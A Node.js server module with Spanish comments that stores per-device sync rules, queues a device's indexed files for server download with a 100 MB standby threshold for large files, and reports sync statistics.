const fs = require('fs');
const path = require('path');
const { getDatasetDir, sanitizeDeviceId } = require('../utils/helpers');

// Helper de Lectura de Reglas de Sincronizacion
function getDeviceSyncRules(safeId) {
  const targetDir = getDatasetDir();
  const rulesPath = path.join(targetDir, 'devices', safeId, 'sync_rules.json');
  let data = { requestedFiles: [], auto_sync_folders: [] };

  if (fs.existsSync(rulesPath)) {
    try {
      const raw = JSON.parse(fs.readFileSync(rulesPath, 'utf8'));
      if (Array.isArray(raw)) {
        data.requestedFiles = raw;
      } else if (raw && typeof raw === 'object') {
        data.requestedFiles = Array.isArray(raw.requestedFiles) ? raw.requestedFiles : [];
        data.auto_sync_folders = Array.isArray(raw.auto_sync_folders) ? raw.auto_sync_folders : [];
      }
    } catch (e) {}
  }
  return data;
}

// Helper de Escritura de Reglas de Sincronizacion
function saveDeviceSyncRules(safeId, rulesData) {
  const targetDir = getDatasetDir();
  const deviceDir = path.join(targetDir, 'devices', safeId);
  if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
  const rulesPath = path.join(deviceDir, 'sync_rules.json');

  const content = {
    requestedFiles: rulesData.requestedFiles || [],
    auto_sync_folders: rulesData.auto_sync_folders || []
  };
  fs.writeFileSync(rulesPath, JSON.stringify(content, null, 2), 'utf8');
  return content;
}

// Servicio de Encolamiento Automatico Global de Archivos (Server-Driven Auto-Sync)
function autoEnqueueDeviceFiles(safeId, options = {}) {
  const targetDir = getDatasetDir();
  const deviceDir = path.join(targetDir, 'devices', safeId);
  const indexPath = path.join(deviceDir, 'file_index.json');
  const downloadsMapPath = path.join(deviceDir, 'downloaded_files.json');

  if (!fs.existsSync(indexPath)) return { totalIndexed: 0, enqueuedPending: 0, enqueuedStandby: 0 };

  let indexList = [];
  try {
    const raw = JSON.parse(fs.readFileSync(indexPath, 'utf8'));
    indexList = Array.isArray(raw) ? raw : (raw.files || []);
  } catch (e) {
    return { error: 'Error al leer file_index.json' };
  }

  let downloadedMap = {};
  if (fs.existsSync(downloadsMapPath)) {
    try { downloadedMap = JSON.parse(fs.readFileSync(downloadsMapPath, 'utf8')); } catch (e) {}
  }

  const rulesData = getDeviceSyncRules(safeId);
  const reqMap = new Map();
  (rulesData.requestedFiles || []).forEach(r => {
    if (r && r.path) reqMap.set(r.path, r);
  });

  let enqueuedPending = 0;
  let enqueuedStandby = 0;
  const maxStandbyThreshold = 100 * 1024 * 1024; // 100 MB umbral para diferir preventivamente

  for (const item of indexList) {
    if (!item || item.isDirectory) continue;
    const filePath = item.absolutePath;
    if (!filePath) continue;

    // Si ya reside en el servidor segun downloaded_files.json
    if (downloadedMap[filePath]) {
      if (reqMap.has(filePath)) {
        const reqObj = reqMap.get(filePath);
        if (reqObj.status !== 'COMPLETED') {
          reqObj.status = 'COMPLETED';
          reqObj.completedAt = reqObj.completedAt || new Date().toISOString();
        }
      }
      continue;
    }

    const existingReq = reqMap.get(filePath);
    if (!existingReq) {
      const sizeBytes = Number(item.sizeBytes) || 0;
      const isLarge = sizeBytes > maxStandbyThreshold;
      const status = (isLarge && !options.includeLarge) ? 'STANDBY' : 'PENDING';

      const newRecord = {
        path: filePath,
        status,
        sizeBytes,
        requestedAt: new Date().toISOString()
      };
      rulesData.requestedFiles.push(newRecord);
      reqMap.set(filePath, newRecord);

      if (status === 'PENDING') enqueuedPending++;
      else enqueuedStandby++;
    } else if (existingReq.status === 'STANDBY' && options.includeLarge) {
      existingReq.status = 'PENDING';
      existingReq.requestedAt = new Date().toISOString();
      enqueuedPending++;
    }
  }

  if (enqueuedPending > 0 || enqueuedStandby > 0) {
    saveDeviceSyncRules(safeId, rulesData);
  }

  return {
    totalIndexed: indexList.length,
    enqueuedPending,
    enqueuedStandby,
    totalPending: rulesData.requestedFiles.filter(r => r.status === 'PENDING').length
  };
}

// Calculo de Estadisticas Globales de Sincronizacion por Dispositivo
function getDeviceSyncStats(safeId) {
  const targetDir = getDatasetDir();
  const deviceDir = path.join(targetDir, 'devices', safeId);
  const indexPath = path.join(deviceDir, 'file_index.json');
  const downloadsMapPath = path.join(deviceDir, 'downloaded_files.json');
  const downloadsDir = path.join(deviceDir, 'downloads');

  let totalFiles = 0;
  let totalBytes = 0;
  if (fs.existsSync(indexPath)) {
    try {
      const raw = JSON.parse(fs.readFileSync(indexPath, 'utf8'));
      const list = Array.isArray(raw) ? raw : (raw.files || []);
      for (const item of list) {
        if (item && !item.isDirectory) {
          totalFiles++;
          totalBytes += Number(item.sizeBytes) || 0;
        }
      }
    } catch (e) {}
  }

  let downloadedFiles = 0;
  if (fs.existsSync(downloadsMapPath)) {
    try {
      const map = JSON.parse(fs.readFileSync(downloadsMapPath, 'utf8'));
      downloadedFiles = Object.keys(map).length;
    } catch (e) {}
  } else if (fs.existsSync(downloadsDir)) {
    try {
      downloadedFiles = fs.readdirSync(downloadsDir).length;
    } catch (e) {}
  }

  const rulesData = getDeviceSyncRules(safeId);
  const pendingFiles = (rulesData.requestedFiles || []).filter(r => r.status === 'PENDING').length;
  const standbyFiles = (rulesData.requestedFiles || []).filter(r => r.status === 'STANDBY').length;
  const completedFiles = (rulesData.requestedFiles || []).filter(r => r.status === 'COMPLETED').length;

  return {
    totalFiles,
    totalBytes,
    downloadedFiles,
    completedFiles,
    pendingFiles,
    standbyFiles
  };
}

module.exports = {
  getDeviceSyncRules,
  saveDeviceSyncRules,
  autoEnqueueDeviceFiles,
  getDeviceSyncStats
};
